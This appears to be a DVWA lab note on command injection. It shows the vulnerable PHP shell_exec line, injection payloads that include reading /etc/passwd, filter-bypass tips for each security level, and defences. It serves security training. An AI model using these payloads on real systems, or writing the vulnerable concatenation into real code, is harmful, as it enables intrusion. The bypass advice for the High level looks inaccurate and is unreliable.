# 💻 Command Injection

## What is Command Injection?

Command Injection occurs when user input is passed directly to a system shell command without proper sanitization. The attacker can append extra OS commands to the intended input.

---

## DVWA Module

The DVWA Command Injection page takes an IP address and runs `ping` on it:

```php
// Vulnerable code (Low level)
$cmd = shell_exec('ping -c 4 ' . $_REQUEST['ip']);
```

The input is directly concatenated — no sanitization at all.

---

## How It Works

Normal input:
```
127.0.0.1
```
Runs: `ping -c 4 127.0.0.1`

Injected input:
```
127.0.0.1; whoami
```
Runs: `ping -c 4 127.0.0.1; whoami`

---

## Payloads

### Basic command separators

```
; whoami
| whoami
&& whoami
|| whoami
` whoami `
$(whoami)
```

### Useful commands to try

```bash
# Who am I?
127.0.0.1; whoami

# List files
127.0.0.1; ls -la

# Read sensitive file
127.0.0.1; cat /etc/passwd

# Network info
127.0.0.1; ifconfig

# Running processes
127.0.0.1; ps aux

# Current directory
127.0.0.1; pwd

# OS version
127.0.0.1; uname -a
```

See [`payloads.txt`](./payloads.txt) for more.

---

## Security Levels

| Level | Protection |
|-------|-----------|
| Low | No filtering — any separator works |
| Medium | Filters `&&` and `;` — try `|` or `\|\|` |
| High | Filters most separators — try `| whoami` (with space) |
| Impossible | Uses `escapeshellcmd()` and strict IP validation — not injectable |

---

## How to Defend

- **Never** pass user input directly to shell commands
- Use language-native functions instead (e.g., PHP's `ping` via sockets)
- Validate input strictly — for IP addresses, use regex: `^\d{1,3}(\.\d{1,3}){3}$`
- Use `escapeshellarg()` in PHP to sanitize arguments
- Run the web server as a low-privilege user
